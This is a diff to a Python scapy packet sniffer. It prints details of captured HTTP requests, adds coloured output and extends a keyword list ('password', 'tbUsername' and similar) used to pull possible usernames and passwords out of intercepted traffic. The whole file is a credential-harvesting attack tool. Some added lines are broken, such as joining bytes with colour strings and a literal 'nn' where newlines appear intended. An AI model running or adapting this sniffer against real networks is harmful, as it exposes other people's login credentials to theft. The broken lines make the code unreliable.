@@ -4,6 +4,8 @@ import sys
 import argparse
 from scapy.layers import http,inet
 
+from colorama import Fore, Back, Style
+
 def get_interface():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--interface", dest="interface", help="Specify interface on which to 	sniff packets")
@@ -85,23 +87,26 @@ def get_ack_number(packet):
             return packet[inet.TCP].ack
     except:
         return "Hidden Acknowledge Number"
+
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
         load = packet[scapy.Raw].load
-        keywords = ["username", "user", "password", "pass", "login"]
+        keywords = ["username", "user", "password", "pass", "login","Username","Password", "tbPassword" , "tbUsername"]
         
         for keyword in keywords:
             try:
                 if keyword in load.decode("utf-8"):
                     return load
             except:
+                print("some issues")
                 break
+
 # A function that Runs after the packet has been catch
 def process_sniffed_packets(packet):
     #If the packet has layer then
     if packet.haslayer(http.HTTPRequest):
         #Getting the Information and Printing it
-        print("\n--------------------------------------------\n")
+        print(Fore.MAGENTA + "\n\t\t --------------------------------------------------------------\n")
         url = get_url(packet)
         ip_src =  get_src_ip(packet)
         ip_des =  get_des_ip(packet)
@@ -109,17 +114,22 @@ def process_sniffed_packets(packet):
         port_des = get_des_port(packet)
         seq_num = get_seq_number(packet)
         ack_num = get_ack_number(packet)
-        print("[+] HTTP Request >>" + url.decode("utf-8"))
-        print("[+]Source Ip : " + ip_src)
-        print("[+]Destination Ip : " + ip_des)
-        print("[+]Source Port : " + str(port_src))
-        print("[+]Destination Port : " + str(port_des))
-        print("[+]Sequence Number : " + str(seq_num))
-        print("[+]Acknowledge Number : " + str(ack_num))
-        print("\n--------------------------------------------\n")
+        print(Fore.YELLOW + "[+]" + Fore.GREEN + " HTTP Request       : " + Fore.YELLOW  + url.decode("utf-8"))
+        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Source Ip          : " + Fore.YELLOW + ip_src)
+        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Destination Ip     : " + Fore.YELLOW + ip_des)
+        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Source Port        : " + Fore.YELLOW + str(port_src))
+        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Destination Port   : " + Fore.YELLOW + str(port_des))
+        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Sequence Number    : " + Fore.YELLOW + str(seq_num))
+        print(Fore.YELLOW + "[+]" + Fore.GREEN + " Acknowledge Number : " + Fore.YELLOW + str(ack_num))
+        print( Fore.MAGENTA + "\n\t\t --------------------------------------------------------------\n")
         login_info = get_login_info(packet)
+        
+       
+
         if login_info:
-            print(b"nn[+] Possible username/password >" + login_info + b"nn")
+            print(b"[+] Possible username/password >" + Back.RED + Fore.YELLOW + login_info + Back.BLACK + b"nn")
+            print( Fore.MAGENTA + "\n\t\t --------------------------------------------------------------\n")
+
 
 
 iface = get_interface()
